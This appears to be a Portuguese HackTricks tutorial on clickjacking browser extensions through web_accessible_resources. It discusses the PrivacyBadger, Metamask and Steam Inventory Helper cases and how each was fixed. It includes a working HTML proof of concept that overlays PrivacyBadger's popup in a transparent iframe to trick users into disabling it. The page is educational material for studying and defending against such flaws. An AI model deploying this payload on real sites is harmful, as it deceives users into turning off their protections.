# BrowExt - ClickJacking

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Informa√ß√µes B√°sicas

Esta p√°gina vai explorar uma vulnerabilidade de ClickJacking em uma extens√£o de navegador.\
Se voc√™ n√£o sabe o que √© ClickJacking, confira:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Extens√µes cont√™m o arquivo **`manifest.json`** e esse arquivo JSON tem um campo `web_accessible_resources`. Veja o que [a documenta√ß√£o do Chrome](https://developer.chrome.com/extensions/manifest/web_accessible_resources) diz sobre isso:

> Esses recursos estariam ent√£o dispon√≠veis em uma p√°gina da web atrav√©s da URL **`chrome-extension://[ID DO PACOTE]/[CAMINHO]`**, que pode ser gerada com o m√©todo **`extension.getURL`**. Recursos na lista de permiss√µes s√£o servidos com cabe√ßalhos CORS apropriados, ent√£o eles est√£o dispon√≠veis atrav√©s de mecanismos como XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Al√©m de serem acess√≠veis pela web, os recursos no **`web_accessible_resources`** funcionam com a autoridade ambiente da extens√£o: eles podem alterar o estado, carregar outros recursos e modificar o navegador de certas maneiras. Se um documento em `web_accessible_resources` pode realizar qualquer comportamento interessante, um atacante pode incorpor√°-lo em uma p√°gina da web e enganar visitantes para ativ√°-lo.

## Exemplo do PrivacyBadger

Foi descoberto que na extens√£o PrivacyBadger, os conte√∫dos do diret√≥rio `skin/` eram `web_accessible_resources`:
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ao carregar `skin/popup.html`, o documento que √© renderizado quando voc√™ clica no √≠cone do PrivacyBadger no navegador, **em um iframe poder√≠amos enganar o usu√°rio a clicar em "Desativar PrivacyBadger para este site"**, expondo o usu√°rio a rastreamento adicional e comprometendo a fun√ß√£o do PrivacyBadger. **Confira o exemplo de v√≠deo de ClickJacking em** [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)

A corre√ß√£o foi simples: **remover `/skin/*` dos `web_accessible_resources`**.

### PoC
```html
<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Exemplo Metamask

Um [**post de blog sobre um ClickJacking no Metamask pode ser encontrado aqui**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Neste caso, o Metamask corrigiu a vulnerabilidade verificando se o protocolo usado para acess√°-lo era **`https:`** ou **`http:`** (e n√£o **`chrome:`**, por exemplo):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Outro ClickJacking corrigido** na extens√£o do Metamask foi que os usu√°rios podiam **Clicar para adicionar √† lista branca** quando uma p√°gina era suspeita de ser phishing por causa de `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Como essa p√°gina era vulner√°vel a Clickjacking, um atacante poderia abusar dela mostrando algo normal para fazer a v√≠tima clicar em adicionar √† lista branca sem perceber, e depois voltar para a p√°gina de phishing que estaria na lista branca.

## Exemplo Steam Inventory Helper

Verifique a seguinte p√°gina para entender como um **XSS** em uma extens√£o de navegador foi combinado com uma vulnerabilidade de **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
